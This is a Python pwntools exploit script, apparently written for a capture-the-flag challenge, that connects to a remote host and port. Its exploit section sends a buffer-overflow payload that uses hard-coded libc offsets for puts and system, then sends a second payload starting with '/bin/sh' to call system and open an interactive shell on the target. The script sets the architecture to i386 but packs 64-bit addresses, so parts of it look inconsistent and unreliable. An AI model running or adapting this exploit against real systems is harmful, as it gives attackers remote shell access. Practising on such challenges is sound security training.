#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 109.233.56.90 --port 11625
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './path/to/binary'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11625)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()
num = 0x4034F8 - 0x4032D8 

libc = 0x7ffff7de3000 
sys_offs = 0x48F20
puts_offs = 0x766B0

pl = b'A'*num + p64(libc + puts_offs) + b'A'*8 + b'\x89\x13@\x00\x00\x00\x00'
io.recvuntil(b'Quick! Shout something: ')
io.sendline(pl)

pl = b'/bin/sh\0' + b'A'*(num - 8) + p64(libc + puts_offs) + b'A'*8 + p64(libc + sys_offs)
io.recvuntil(b'Now you can do whatever you want: ')
io.sendline(pl)

io.interactive()

